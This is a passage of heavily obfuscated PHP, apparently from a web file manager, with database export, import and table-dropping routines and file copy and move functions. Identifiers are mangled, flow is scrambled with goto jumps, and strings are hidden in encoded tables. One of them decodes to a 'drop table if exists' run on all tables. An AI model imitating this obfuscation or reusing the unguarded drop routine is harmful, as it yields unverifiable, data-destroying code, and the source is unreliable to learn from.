($c¡‘¼ø›¡) { $c¡‘¼ø›¡->task[$_SERVER[¦·][981]] = $eõÔ˜Ö¦¡§; } $b¤©„ ÂÈä = $this->model($eõÔ˜Ö¦¡§); $Cƒ÷ÂÀäñ“ = 0; goto d†‚Ê¬ÓêÂ; açŒƒ–‹ªï: $B¬Ê¸Á¯˜Ï = $b¤©„ ÂÈä->getPk(); $cĞÓê˜Á„ˆ = $b¤©„ ÂÈä->getDbFields(); do { $e¤–¤ÎÛìå = $b¤©„ ÂÈä->field($cĞÓê˜Á„ˆ)->order($B¬Ê¸Á¯˜Ï . $_SERVER[¦·][984])->selectPage($Aœ´›‚²¥¸, $càßê›‹‡Á); $C­ä¶İØôë = isset($e¤–¤ÎÛìå[$_SERVER[¦·][351]][$_SERVER[¦·][353]]) ? $e¤–¤ÎÛìå[$_SERVER[¦·][351]][$_SERVER[¦·][353]] : 0; $D”“å½„í = !empty($e¤–¤ÎÛìå[$_SERVER[¦·][354]]) ? $e¤–¤ÎÛìå[$_SERVER[¦·][354]] : array(); if (!($BÊß÷ÉÙ×Ñ = count($D”“å½„í))) { break; } $C´Œ¤‰¨¦† = array(); foreach ($D”“å½„í as $f‰âÂÌÓµ) { if ($eõÔ˜Ö¦¡§ == $_SERVER[¦·][985] && $f‰âÂÌÓµ[$_SERVER[¦·][29]] == $_SERVER[¦·][986]) { $fÛ°¾áØË = json_decode($f‰âÂÌÓµ[$_SERVER[¦·][359]], !0); if ($fÛ°¾áØË[$_SERVER[¦·][28]] == date($_SERVER[¦·][691]) && !$fÛ°¾áØË[$_SERVER[¦·][690]]) { continue; } } if ($f„‚ÙÈˆ«‚) { $f‰âÂÌÓµ[$_SERVER[¦·][75]] = "\173\151\157\72{$f„‚ÙÈˆ«‚}\x7d" . substr($f‰âÂÌÓµ[$_SERVER[¦·][75]], strlen("\173\151\157\x3a{$f‰âÂÌÓµ[$_SERVER[¦·][744]]}\175")); $f‰âÂÌÓµ[$_SERVER[¦·][744]] = $f„‚ÙÈˆ«‚; } $C´Œ¤‰¨¦†[] = $_SERVER[¦·][987] . $this->sqlEncode($f‰âÂÌÓµ) . $_SERVER[¦·][988]; } $Eğ¿éÌŠ›‰ = "\111\116\x53\105\122\124\40\x49\x4e\124\x4f\40\x60{$eõÔ˜Ö¦¡§}\x60\40\50\140" . implode($_SERVER[¦·][989], $cĞÓê˜Á„ˆ) . $_SERVER[¦·][990]; fwrite($e‰åÖé—Å‰, $Eğ¿éÌŠ›‰ . implode($_SERVER[¦·][991], $C´Œ¤‰¨¦†) . $_SERVER[¦·][67] . PHP_EOL); $càßê›‹‡Á++; $Cƒ÷ÂÀäñ“ += $BÊß÷ÉÙ×Ñ; if ($c¡‘¼ø›¡) { $c¡‘¼ø›¡->update($BÊß÷ÉÙ×Ñ); } } while ($càßê›‹‡Á <= $C­ä¶İØôë); goto EŞÃÀŠÒöÓ; EŞÃÀŠÒöÓ: fclose($e‰åÖé—Å‰); return $Cƒ÷ÂÀäñ“; goto dÅÄ§µíÅ‰; dÅÄ§µíÅ‰: } public function sqlToDb($F¨ÔÁĞÈÕÖ, $b±Øİ¾¸î¯ = null) { goto F¯¤œÕë™; Dè‡Ğ·äõ¡: $D‰Õ„ó×™ê = 500 + 1; while (!feof($D”‡Ìî²¯ô)) { if ($b±Øİ¾¸î¯ && $CöÄå´Œó— != 0) { $b±Øİ¾¸î¯->task[$fº¸ƒ…®…ƒ[979]] += 1; } $CöÄå´Œó—++; $C„Šöâ›‘³ = trim(fgets($D”‡Ìî²¯ô)); $d‚¤õ­îŸ .= $fº¸ƒ…®…ƒ[50] . $this->sqlDecode($C„Šöâ›‘³, $this->type); if ($CöÄå´Œó— == $D‰Õ„ó×™ê) { $d‚¤õ­îŸ = rtrim(trim($d‚¤õ­îŸ), $fº¸ƒ…®…ƒ[67]); if (!$FÑëƒÂ²->execute($d‚¤õ­îŸ)) { return !1; } if ($b±Øİ¾¸î¯) { $b±Øİ¾¸î¯->update($CöÄå´Œó— - 1); } $d‚¤õ­îŸ = $fº¸ƒ…®…ƒ[33]; $CöÄå´Œó— = 0; } } fclose($D”‡Ìî²¯ô); goto d³“Ş«à¸; d³“Ş«à¸: if (trim($d‚¤õ­îŸ)) { $d‚¤õ­îŸ = rtrim(trim($d‚¤õ­îŸ), $fº¸ƒ…®…ƒ[67]); if (!$FÑëƒÂ²->execute($d‚¤õ­îŸ)) { return !1; } if ($b±Øİ¾¸î¯) { $b±Øİ¾¸î¯->update($CöÄå´Œó— - 1); } } return !0; goto bïğ¹çÎÛ¥; F¯¤œÕë™: $fº¸ƒ…®…ƒ =& $_SERVER[¦·]; $FÑëƒÂ² = $this->model()->db(); $D”‡Ìî²¯ô = @fopen($F¨ÔÁĞÈÕÖ, $fº¸ƒ…®…ƒ[992]); goto Cå—ÓÒˆéÕ; Cå—ÓÒˆéÕ: if (!$D”‡Ìî²¯ô) { return !1; } $CöÄå´Œó— = 0; $d‚¤õ­îŸ = $fº¸ƒ…®…ƒ[33]; goto Dè‡Ğ·äõ¡; bïğ¹çÎÛ¥: } public function dropTable($Bö¯ÊŸŠÕÉ = null) { $e§¥Àë¦ğ½ = $this->model()->db(); $dÉ’å„™Œ = $Bö¯ÊŸŠÕÉ ? array($Bö¯ÊŸŠÕÉ) : $e§¥Àë¦ğ½->getTables(); if (!$dÉ’å„™Œ) { return; } foreach ($dÉ’å„™Œ as $Bö¯ÊŸŠÕÉ) { $e§¥Àë¦ğ½->execute("\144\x72\157\160\40\x74\141\x62\x6c\x65\x20\x69\146\x20\145\170\x69\163\164\163\x20\x60{$Bö¯ÊŸŠÕÉ}\x60"); } } private function taskToCache($cùŞÌö‰³â = null) { $fµÌ‡Õ¶… =& $_SERVER[¦·]; if (!$cùŞÌö‰³â) { return; } $F¹ï…á„íÒ = array($fµÌ‡Õ¶…[981] => $cùŞÌö‰³â->task[$fµÌ‡Õ¶…[981]], $fµÌ‡Õ¶…[979] => $cùŞÌö‰³â->task[$fµÌ‡Õ¶…[979]], $fµÌ‡Õ¶…[993] => $cùŞÌö‰³â->task[$fµÌ‡Õ¶…[993]]); if ($F¹ï…á„íÒ[$fµÌ‡Õ¶…[979]] == $F¹ï…á„íÒ[$fµÌ‡Õ¶…[993]]) { $F¹ï…á„íÒ[$fµÌ‡Õ¶…[697]] = 1; } Cache::set($fµÌ‡Õ¶…[994] . $cùŞÌö‰³â->task[$fµÌ‡Õ¶…[367]], $F¹ï…á„íÒ); $cùŞÌö‰³â->end(); } private function sqlEncode($b…—²‹“™) { $eÓÄ´Ğ‚ªÎ =& $_SERVER[¦·]; $D¸ï††àô¡ = array(); foreach ($b…—²‹“™ as $dÇÑñ‡¢ê) { if (is_array($dÇÑñ‡¢ê)) { $dÇÑñ‡¢ê = json_encode_force($dÇÑñ‡¢ê); } $dÇÑñ‡¢ê = addslashes($dÇÑñ‡¢ê); $dÇÑñ‡¢ê = str_replace(array($eÓÄ´Ğ‚ªÎ[995], $eÓÄ´Ğ‚ªÎ[217]), array($eÓÄ´Ğ‚ªÎ[996], $eÓÄ´Ğ‚ªÎ[997]), $dÇÑñ‡¢ê); $D¸ï††àô¡[] = str_replace($eÓÄ´Ğ‚ªÎ[55], $eÓÄ´Ğ‚ªÎ[998], $dÇÑñ‡¢ê); } return $eÓÄ´Ğ‚ªÎ[55] . implode($eÓÄ´Ğ‚ªÎ[999], $D¸ï††àô¡) . $eÓÄ´Ğ‚ªÎ[55]; } private function sqlDecode($d½‚×‚ê…­, $Cƒ¡ÍğÓÊâ) { $CŠ²¯ÂĞ± =& $_SERVER[¦·]; $d½‚×‚ê…­ = str_replace(array($CŠ²¯ÂĞ±[996], $CŠ²¯ÂĞ±[997]), array($CŠ²¯ÂĞ±[995], $CŠ²¯ÂĞ±[217]), $d½‚×‚ê…­); if ($Cƒ¡ÍğÓÊâ == $CŠ²¯ÂĞ±[9]) { $d½‚×‚ê…­ = stripslashes($d½‚×‚ê…­); } return $d½‚×‚ê…­; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Eç¥Çê’£å, $cÃ—³Àó) { $cŠïìâÍ÷ô = self::driverMake($cÃ—³Àó[0]); if (method_exists($cŠïìâÍ÷ô, $Eç¥Çê’£å)) { return @call_user_func_array(array($cŠïìâÍ÷ô, $Eç¥Çê’£å), $cÃ—³Àó); } if (method_exists($cŠïìâÍ÷ô, $_SERVER[¦·][1000])) { return @call_user_func_array(array($cŠïìâÍ÷ô, $Eç¥Çê’£å), $cÃ—³Àó); } else { if (method_exists(self, $Eç¥Çê’£å)) { return @call_user_func_array(array(self, $Eç¥Çê’£å), $cÃ—³Àó); } else { call_user_func_array(array(parent, $Eç¥Çê’£å), $cÃ—³Àó); } } } public static function init($aòîÉ™°›É) { return self::driverMake($aòîÉ™°›É); } public static function copy($fìÒéÙ›¤§, $aáÔ¿«ò , $añâ”éËÔˆ = false, $Dä‡†¼ÌÌø = false) { return self::copyMove($fìÒéÙ›¤§, $aáÔ¿«ò , $añâ”éËÔˆ, $_SERVER[¦·][492], $Dä‡†¼ÌÌø); } public static function move($EÉÚ¹‚Õ‹, $bªå¿‚Â¸Ã, $F³À·Óß = false, $D”Û×‡ìéÆ = false) { return self::copyMove($EÉÚ¹‚Õ‹, $bªå¿‚Â¸Ã, $F³À·Óß, $_SERVER[¦·][494], $D”Û×‡ìéÆ); } public static function saveFile($Cƒ‚§²Œ»§, $A¡Ìœôƒâå, $e®¬ß³¢Ç = true) { goto B®òÛß§Ù; Câ×èÇ¾á„: $eœ«Æß‹Üø = self::driverMake($A¡Ìœôƒâå); $B›ìî§ì… = !1; if ($eœ«Æß‹Üø->pathParse[$d¸¶åÄí›[1001]]) { $Cİğ³Ç’³Ë = $eœ«Æß‹Üø->pathParse[$d¸¶åÄí›[1001]]; $B›ìî§ì… = $eœ«Æß‹Üø; $eœ«Æß‹Üø = self::driverMake($Cİğ³Ç’³Ë); } goto C§¯áç¯; B®òÛß§Ù: $d¸¶åÄí› =& $_SERVER[¦·]; $A“øÆù•Ÿ‹ = self::info($A¡Ìœôƒâå); $c¥Ê‹¦î¦ = self::driverMake($Cƒ‚§²Œ»§); goto Câ×èÇ¾á„; b²õÜƒÑš: $fÉùËÒ§®× = self::copyFile($c¥Ê‹¦î¦, $Cƒ‚§²Œ»§, $eœ«Æß‹Üø, $eç¡¤òÕåñ, $A“øÆù•Ÿ‹[$d¸¶åÄí›[28]], $c¶”ËºÄ‚Å); if ($B›ìî§ì…) { $fÉùËÒ§®× = $B›ìî§ì…->getPathOuter($fÉùËÒ§®×); } return $fÉùËÒ§®×; goto AÉğí‰›œ¤; C§¯áç¯: $eç¡¤òÕåñ = $eœ«Æß‹Üø->pathFather($A¡Ìœôƒâå); $c¶”ËºÄ‚Å = !0; if (!$e®¬ß³¢Ç && self::driverIsSame($c¥Ê‹¦î¦, $eœ«Æß‹Üø)) { $c¶”ËºÄ‚Å = !1; } goto b²õÜƒÑš; AÉğí‰›œ¤: } private static function copyMove($F‹é‚Êõ‡ö, $FÎ³‹Áá¾‚, $A¥Ğé‚Ûª, $a—ÓŒ«©, $dë•‚¹¼åË = false) { goto cÕÕ½Ò«²³; E‰ˆÚ–¿á: $A´ë¬ºâ = $f”â§¦´›->isFile($F‹é‚Êõ‡ö); if (!$A´ë¬ºâ && $fÚŸÕ±ÇóÍ->getType() == $CÒá’ªÇ ›[695] && $f”â§¦´›->getType() == $CÒá’ªÇ ›[102]) { $eÅğ¤ë„ß = $fÚŸÕ±ÇóÍ->copyFolderFromIO($f”â§¦´›, $F‹é‚Êõ‡ö, $FÎ³‹Áá¾‚, $A¥Ğé‚Ûª, $eŒù”µ„, $dë•‚¹¼åË); } else { $eÅğ¤ë„ß = self::copyPath($f”â§¦´›, $F‹é‚Êõ‡ö, $fÚŸÕ±ÇóÍ, $FÎ³‹Áá¾‚, $A¥Ğé‚Ûª, $eŒù”µ„, $A´ë¬ºâ, $dë•‚¹¼åË); } if ($eÅğ¤ë„ß && $eŒù”µ„) { $f”â§¦´›->remove($F‹é‚Êõ‡ö); } goto C¢‘…åêÖ¹; F»…Å‰ßØ: $f”â§¦´› = self::driverMake($F‹é‚Êõ‡ö); $fÚŸÕ±ÇóÍ = self::driverMake($FÎ³‹Áá¾‚); $eŒù”µ„ = $a—ÓŒ«© == $CÒá’ªÇ ›[494]; goto eº¹ãùĞÑã; eº¹ãùĞÑã: $C¼¾÷ôóÔƒ = !1; if ($fÚŸÕ±ÇóÍ->pathParse[$CÒá’ªÇ ›[1001]]) { $FÎ³‹Áá¾‚ = $fÚŸÕ±ÇóÍ->pathParse[$CÒá’ªÇ ›[1001]]; $C¼¾÷ôóÔƒ = $fÚŸÕ±ÇóÍ; $fÚŸÕ±ÇóÍ = self::driverMake($FÎ³‹Áá¾‚); } self::check($f”â§¦´›, $F‹é‚Êõ‡ö, $fÚŸÕ±ÇóÍ, $FÎ³‹Áá¾‚); goto CÄÈœ‚½‹É; cÕÕ½Ò«²³: $CÒá’ªÇ › =& $_SERVER[¦·]; if (!$F‹é‚Êõ‡ö || $F‹é‚Êõ‡ö == $CÒá’ªÇ ›[8] || !$FÎ³‹Áá¾‚) { return !1; } ignore_timeout(); goto F»…Å‰ßØ; CÄÈœ‚½‹É: Hook::trigger($CÒá’ªÇ ›[72], $f”â§¦´›, $F‹é‚Êõ‡ö, $fÚŸÕ±ÇóÍ, $FÎ³‹Áá¾‚); $f¹°òë¡˜ = self::driverIsSame($f”â§¦´›, $fÚŸÕ±ÇóÍ); if ($f¹°òë¡˜) { if ($a—ÓŒ«© == $CÒá’ªÇ ›[494] && !method_exists($fÚŸÕ±ÇóÍ, $CÒá’ªÇ ›[1002]) && trim($FÎ³‹Áá¾‚, $CÒá’ªÇ ›[8]) == trim($fÚŸÕ±ÇóÍ->pathFather($F‹é‚Êõ‡ö), $CÒá’ªÇ ›[8])) { return $fÚŸÕ±ÇóÍ->getPathOuter($F‹é‚Êõ‡ö); } if (method_exists($fÚŸÕ±ÇóÍ, $a—ÓŒ«©)) { return $fÚŸÕ±ÇóÍ->{$a—ÓŒ«©}($F‹é‚Êõ‡ö, $FÎ³‹Áá¾‚, $A¥Ğé‚Ûª); } } goto E‰ˆÚ–¿á; C¢‘…åêÖ¹: if ($C¼¾÷ôóÔƒ) { $eÅğ¤ë„ß = $C¼¾÷ôóÔƒ->getPathOuter($eÅğ¤ë„ß); } return $eÅğ¤ë„ß; goto eİÅğîèïÌ; eİÅğîèïÌ: } private static function check($bÊõíå…‡, $FøŒ¸¬œ‡Ú, $e±ø“®¥Ë…, &$B¾…‹÷½ºÑ) { $b´•Îî’ô” =& $_SERVER[¦·]; if (self::driverIsSame($bÊõíå…‡, $e±ø“®¥Ë…) && $bÊõíå…‡->isFolder($FøŒ¸¬œ‡Ú) && $bÊõíå…‡->isParentOf($FøŒ¸¬œ‡Ú, $B¾…‹÷½ºÑ)) { show_json(LNG($b´•Îî’ô”[1003]), !1); } if (!$bÊõíå…‡->exist($FøŒ¸¬œ‡Ú)) { show_json(LNG($b´•Îî’ô”[101]), !1); } } private static function copyPath($eÎ—¿¦“ğ…, $D´ğ¡¹À©, $FÙ«Û×Óœç, $Cò„…ĞñÚ², $C‡ïˆ°Æ¦, $aÉÍ­ºŠˆÕ, $e²ÛË™‡ëÈ, $C¨›è¬Š®® = false) { goto bÂåˆ‚àŠ‹; aˆÙ‡—÷Ò: $C¬µ¥—¥ƒÏ = $FÙ«Û×Óœç->mkdir($FÙ«Û×Óœç->getPath($AˆÍÑŞî”«)); $Cò„…ĞñÚ² = $FÙ«Û×Óœç->getPathInner($C¬µ¥—¥ƒÏ); $E¿‹¥îÀ = $eÎ—¿¦“ğ…->listPath($D´ğ¡¹À©, !0); goto E“íå„à…÷; bÂåˆ‚àŠ‹: $cö£ÂÂËàß =& $_SERVER[¦·]; $d÷ğˆäì‚« = $C¨›è¬Š®® ? $C¨›è¬Š®® : $eÎ—¿¦“ğ…->getPathName($eÎ—¿¦“ğ…->pathThis($D´ğ¡¹À©)); if ($C‡ïˆ°Æ¦) { $D¿…•…•ñ© = $FÙ«Û×Óœç->fileNameExist($Cò„…ĞñÚ², $d÷ğˆäì‚«); $d÷ğˆäì‚« = $FÙ«Û×Óœç->fileNameAuto($Cò„…ĞñÚ², $d÷ğˆäì‚«, $C‡ïˆ°Æ¦, !$e²ÛË™‡ëÈ); $C‡ïˆ°Æ¦ = $D¿…•…•ñ© ? $C‡ïˆ°Æ¦ : !1; } goto fÂÌ’œŒ·å; E“íå„à…÷: $CÓñ‘¢§‰‡ = array_merge($E¿‹¥îÀ[$cö£ÂÂËàß[73]], $E¿‹¥îÀ[$cö£ÂÂËàß[74]]); foreach ($CÓñ‘¢§‰‡ as $fŒ¹İ³ášˆ) { $Cõ‰Ôë½ê = $fŒ¹İ³ášˆ[$cö£ÂÂËàß[29]] == $cö£ÂÂËàß[167]; $D´ğ¡¹À© = $eÎ—¿¦“ğ…->getPathInner($fŒ¹İ³ášˆ[$cö£ÂÂËàß[75]]); $d»“ö±ÊŞ» = self::copyPath($eÎ—¿¦“ğ…, $D´ğ¡¹À©, $FÙ«Û×Óœç, $Cò„…ĞñÚ², $C‡ïˆ°Æ¦, $aÉÍ­ºŠˆÕ, $Cõ‰Ôë½ê); if (!$d»“ö±ÊŞ») { write_log($cö£ÂÂËàß[1004] . $D´ğ¡¹À© . $cö£ÂÂËàß[1005] . $Cò„…ĞñÚ², $cö£ÂÂËàß[1006]); } } return $C¬µ¥—¥ƒÏ; goto cÇœ°…±çó; fÂÌ’œŒ·å: if ($e²ÛË™‡ëÈ) { return self::copyFile($eÎ—¿¦“ğ…, $D´ğ¡¹À©, $FÙ«Û×Óœç, $Cò„…ĞñÚ², $d÷ğˆäì‚«, $aÉÍ­ºŠˆÕ); } if ($C‡ïˆ°Æ¦ == REPEAT_RENAME_FOLDER) { $C‡ïˆ°Æ¦ = !1; } $AˆÍÑŞî”« = rtrim($Cò„…ĞñÚ², $cö£ÂÂËàß[8]) . $cö£ÂÂËàß[8] . $d÷ğˆäì‚«; goto aˆÙ‡—÷Ò; cÇœ°…±çó: } private static function copyFile($bˆì…ÆŞ–, $AÜŒê°ñ, $EóøğŞ–¨Õ, $cÓªÒÖ£ğ, $d×¿ƒÖ†½Ú, $dÈ‰„·¯ˆ²) { goto eÓ“¬±ÖßÎ; A«„Œ«í­Ò: mk_dir($cÇèÉò·½); $eè³¥†Šİ¹ = $cÇèÉò·½ . $aÑ…Ò­ğ„ã; $eè³¥†Šİ¹ = $bˆì…ÆŞ–->download($AÜŒê°ñ, $eè³¥†Šİ¹); goto BêƒŒ³÷Ÿš; A¥²ô¨³å–: Hook::trigger($A½ïƒÏÃ“[1008], $bˆì…ÆŞ–, $AÜŒê°ñ, $EóøğŞ–¨Õ, $cÓªÒÖ£ğ, $d×¿ƒÖ†½Ú, $aÑ…Ò­ğ„ã); if (self::driverIsSame($bˆì…ÆŞ–, $EóøğŞ–¨Õ)) { if ($dÈ‰„·¯ˆ²) { $eÖ†Ï›“¥ = $EóøğŞ–¨Õ->moveFile($AÜŒê°ñ, $cÓªÒÖ£ğ); } else { $eÖ†Ï›“¥ = $EóøğŞ–¨Õ->copyFile($AÜŒê°ñ, $cÓªÒÖ£ğ); } Hook::trigger($A½ïƒÏÃ“[1009], $bˆì…ÆŞ–, $AÜŒê°ñ, $EóøğŞ–¨Õ, $cÓªÒÖ£ğ, $d×¿ƒÖ†½Ú, $eÖ†Ï›“¥); return $eÖ†Ï›“¥; } $cÇèÉò·½ = TEMP_FILES; goto A«„Œ«í­Ò; c¾îèÓß®: Hook::trigger($A½ïƒÏÃ“[1009], $bˆì…ÆŞ–, $AÜŒê°ñ, $EóøğŞ–¨Õ, $cÓªÒÖ£ğ, $d×¿ƒÖ†½Ú, $eÖ†Ï›“¥); return $eÖ†Ï›“¥; goto cÍöÈ‰² Ò; BêƒŒ³÷Ÿš: $eè³¥†Šİ¹ = $bˆì…ÆŞ–->iconvApp($eè³¥†Šİ¹); $eÖ†Ï›“¥ = $EóøğŞ–¨Õ->upload($cÓªÒÖ£ğ, $eè³¥†Šİ¹, $dÈ‰„·¯ˆ²); self::remove($cÇèÉò·½ . $aÑ…Ò­ğ„ã); goto c¾îèÓß®; eÓ“¬±ÖßÎ: $A½ïƒÏÃ“ =& $_SERVER[¦·]; $cÓªÒÖ£ğ = $EóøğŞ–¨Õ->getPath(rtrim($cÓªÒÖ£ğ, $A½ïƒÏÃ“[8]) . $A½ïƒÏÃ“[8] . $d×¿ƒÖ†½Ú); $aÑ…Ò­ğ„ã = $A½ïƒÏÃ“[1007] . time() . rand_string(5); goto A¥²ô¨³å–; cÍöÈ‰² Ò: } public static function pathFather($a¨óˆê“ÎÎ) { $Ağ‰£’ì = IO::init($a¨óˆê“ÎÎ); $d ÊŠ¦æÌø = $Ağ‰£’ì->pathFather($Ağ‰£’ì->path); return $Ağ‰£’ì->getPathOuter($d ÊŠ¦æÌø); } public static function fileOut($A¼±ÂïØ¯Ä, $aÔÎ‡ÈÛó¾ = false, $BÇ™’¹Êèó = false, $Aº‹ëÊÊè = '') { $cÜˆŒĞêŒ¡ = self::driverMake($A¼±ÂïØ¯Ä); if ($cÜˆŒĞêŒ¡->isFileOutServer()) { return $cÜˆŒĞêŒ¡->fileOutServer($A¼±ÂïØ¯Ä, $aÔÎ‡ÈÛó¾, $BÇ™’¹Êèó, $Aº‹ëÊÊè); } return $cÜˆŒĞêŒ¡->fileOut($A¼±ÂïØ¯Ä, $aÔÎ‡ÈÛó¾, $BÇ™’¹Êèó, $Aº‹ëÊÊè); } public static function fileOutImage($e‹§¥È•ØÙ, $dØ™Õó‘Îš = 250) { $Aµ¡ê“ª¸  = array(250, 600, 1200, 3000); for ($F®˜º°Ú—ª = 0; $F®˜º°Ú—ª < count($Aµ¡ê“ª¸ ); $F®˜º°Ú—ª++) { if ($F®˜º°Ú—ª == 0 && $dØ™Õó‘Îš <= $Aµ¡ê“ª¸ [$F®˜º°Ú—ª]) { $dØ™Õó‘Îš = $Aµ¡ê“ª¸ [$F®˜º°Ú—ª]; break; } else { if ($dØ™Õó‘Îš > $Aµ¡ê“ª¸ [$F®˜º°Ú—ª - 1] && $dØ™Õó‘Îš <= $Aµ¡ê“ª¸ [$F®˜º°Ú—ª]) { $dØ™Õó‘Îš = $Aµ¡ê“ª¸ [$F®˜º°Ú—ª]; break; } else { if ($F®˜º°Ú—ª == count($Aµ¡ê“ª¸ ) - 1 && $dØ™Õó‘Îš > $Aµ¡ê“ª¸ [$F®˜º°Ú—ª]) { $dØ™Õó‘Îš = $Aµ¡ê“ª¸ [$F®˜º°Ú—ª]; break; } } } } $B‚Ñ¯Œ = self::driverMake($e‹§¥È•ØÙ); if ($B‚Ñ¯Œ->isFileOutServer()) { return $B‚Ñ¯Œ->fileOutImageServer($e‹§¥È•ØÙ, $dØ™Õó‘Îš); } return $B‚Ñ¯Œ->fileOutImage($e‹§¥È•ØÙ, $dØ™Õó‘Îš); } private static function driverIsSame($bêòß–¬´Ù, $Fõ“ôºÔá•) { goto bøÀ‹Ş©‹²; CÓ²ğ­¾‡Œ: if ($bêòß–¬´Ù->pathDriver == $Fõ“ôºÔá•->pathDriver) { return !0; } return !1; goto dØÊö«ÃñŞ; EëÜ±àÎÜ“: if ($e›ã©åŒË¿ != $fÌ¶¼ï·½”) { return !1; } if ($e›ã©åŒË¿ == $C²İÂÏŞ¨[695]) { return !0; } if ($e›ã©åŒË¿ == $C²İÂÏŞ¨[102]) { return !0; } goto CÓ²ğ­¾‡Œ; bøÀ‹Ş©‹²: $C²İÂÏŞ¨ =& $_SERVER[¦·]; $e›ã©åŒË¿ = $bêòß–¬´Ù->getType(); $fÌ¶¼ï·½” = $Fõ“ôºÔá•->getType(); goto EëÜ±àÎÜ“; dØÊö«ÃñŞ: } public static function copyUpdate($FëÌùää»—, $båÆÃ£Âô) { goto C”Ÿˆ„Š¡ã; C”Ÿˆ„Š¡ã: $E…áÔÛ¥‘ =& $_SERVER[¦·]; if (!IO::exist($FëÌùää»—)) { return !1; } if (!IO::exist($båÆÃ£Âô)) { IO::mkdir($båÆÃ£Âô); } goto D‚½¯Â’ÆÆ; fá÷ÚùµŒ‚: Hook::trigger($E…áÔÛ¥‘[1013], $FëÌùää»—, $båÆÃ£Âô, $a„°”Ğ‚‰¬); foreach ($cŒÏˆª’É as $E®•ªƒ´Øë) { IO::mkdir($E®•ªƒ´Øë); } foreach ($f™µ§‡ƒÕ‘ as $E®•ªƒ´Øë) { IO::copy($E®•ªƒ´Øë[$E…áÔÛ¥‘[1010]], $E®•ªƒ´Øë[$E…áÔÛ¥‘[1011]], REPEAT_REPLACE); } goto Cñ‹áå½Ôè; DòÅÎœæÂÔ: $cŒÏˆª’É = array(); foreach ($B’öÈß¯Öø as $B›Š§œÏ => $E®•ªƒ´Øë) { if (isset($A¿àçô¸×»[$B›Š§œÏ])) { if ($E®•ªƒ´Øë[$E…áÔÛ¥‘[76]] == 1) { continue; } if ($A¿àçô¸×»[$B›Š§œÏ][$E…áÔÛ¥‘[77]] == $E®•ªƒ´Øë[$E…áÔÛ¥‘[77]]) { continue; } } if ($E®•ªƒ´Øë[$E…áÔÛ¥‘[76]] == 1) { $cŒÏˆª’É[] = $båÆÃ£Âô . $E…áÔÛ¥‘[8] . $B›Š§œÏ; continue; } $a÷ì—…ÕÒ = strstr(trim($B›Š§œÏ, $E…áÔÛ¥‘[8]), $E…áÔÛ¥‘[8]) ? get_path_father($B›Š§œÏ) : $E…áÔÛ¥‘[33]; $f™µ§‡ƒÕ‘[] = array($E…áÔÛ¥‘[1010] => $E®•ªƒ´Øë[$E…áÔÛ¥‘[75]], $E…áÔÛ¥‘[1011] => rtrim($båÆÃ£Âô, $E…áÔÛ¥‘[8]) . $E…áÔÛ¥‘[8] . $a÷ì—…ÕÒ, $E…áÔÛ¥‘[1012] => $E®•ªƒ´Øë); } $a„°”Ğ‚‰¬ = array($E…áÔÛ¥‘[167] => $f™µ§‡ƒÕ‘, $E…áÔÛ¥‘[76] => $cŒÏˆª’É); goto fá÷ÚùµŒ‚; D‚½¯Â’ÆÆ: $B’öÈß¯Öø = self::_listAll($FëÌùää»—); $A¿àçô¸×» = self::_listAll($båÆÃ£Âô); $f™µ§‡ƒÕ‘ = array(); goto DòÅÎœæÂÔ; Cñ‹áå½Ôè: } private static function _listAll($BÑ¿›…Á¼) { $DçÂâö»òÀ =& $_SERVER[¦·]; $BÑ¿›…Á¼ = KodIO::clear($BÑ¿›…Á¼); $F«ÏöŞ¯ = IO::listAll($BÑ¿›…Á¼); foreach ($F«ÏöŞ¯ as &$EÅàË·¤Á) { $EÔì¾¥ÑÒö = substr($EÅàË·¤Á[$DçÂâö»òÀ[75]], strlen($BÑ¿›…Á¼)); $EÅàË·¤Á[$DçÂâö»òÀ[1014]] = trim($EÔì¾¥ÑÒö, $DçÂâö»òÀ[8]); } unset($EÅàË·¤Á); return array_to_keyvalue($F«ÏöŞ¯, $DçÂâö»òÀ[1014]); } public static function fileSubstr($dÊ’ï™Ùâç, $F¸ñ½â†ŒÅ, $D‰Ã£İÅ˜¤ = false) { goto E¢¶İ²´æä; dÙ¬ßê’·á: if ($F¸ñ½â†ŒÅ + $D‰Ã£İÅ˜¤ > $F¯¢É™ê«ã) { $D‰Ã£İÅ˜¤ = $F¯¢É™ê«ã - $F¸ñ½â†ŒÅ; } if ($D‰Ã£İÅ˜¤ <= 0) { return $_SERVER[¦·][33]; } if ($F¸ñ½â†ŒÅ < 0 || $F¸ñ½â†ŒÅ >= $F¯¢É™ê«ã || $D‰Ã£İÅ˜¤ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\x65\x52\x65\x61\144\x20\145\x72\x72\x6f\x72\x21\x20\x73\164\x61\162\x74\75{$F¸ñ½â†ŒÅ}\x3b\154\x65\156\147\164\x68\75{$D‰Ã£İÅ˜¤}\73\x20\x73\x69\172\x65\75{$F¯¢É™ê«ã}\x3b"); } goto C•†‘Õ’ÈÓ; C•†‘Õ’ÈÓ: return $cœî†ËÙë->fileSubstr($dÊ’ï™Ùâç, $F¸ñ½â†ŒÅ, $D‰Ã£İÅ˜¤); goto AÜÈËøôò; BÙË›ÄÕŠ: $bš‡“¶¹®å = $D‰Ã£İÅ˜¤; if ($F¸ñ½â†ŒÅ < 0) { $F¸ñ½â†ŒÅ = $F¯¢É™ê«ã + $F¸ñ½â†ŒÅ; } if ($D‰Ã£İÅ˜¤ === !1) { $D‰Ã£İÅ˜¤ = $F¯¢É™ê«ã - $F¸ñ½â†ŒÅ; } goto dÙ¬ßê’·á; E¢¶İ²´æä: $cœî†ËÙë = self::driverMake($dÊ’ï™Ùâç); $F¯¢É™ê«ã = $cœî†ËÙë->size($dÊ’ï™Ùâç); $EĞÂŒ‡­Ã¸ = $F¸ñ½â†ŒÅ; goto BÙË›ÄÕŠ; AÜÈËøôò: } private static function driverMake(&$Fá½¼ÛÆÇä) { goto aÃ¯œ§öÂ¨; aÃ¯œ§öÂ¨: $cºæÂ„õ˜° =& $_SERVER[¦·]; $c¬ä‡¡Òƒ­ = KodIO::parse($Fá½¼ÛÆÇä); if (!self::$driverListSystem) { $f„ŠØ™§ = Model($cºæÂ„õ˜°[704])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($f„ŠØ™§, $cºæÂ„õ˜°[367]); } goto f÷â‰¦˜ñÀ; Dë‡’à¢ÍÁ: return $fÁä÷Ÿ¡ß¢; goto c•¢ô”Š‘¶; f÷â‰¦˜ñÀ: if ($c¬ä‡¡Òƒ­[$cºæÂ„õ˜°[29]] == KodIO::KOD_IO && 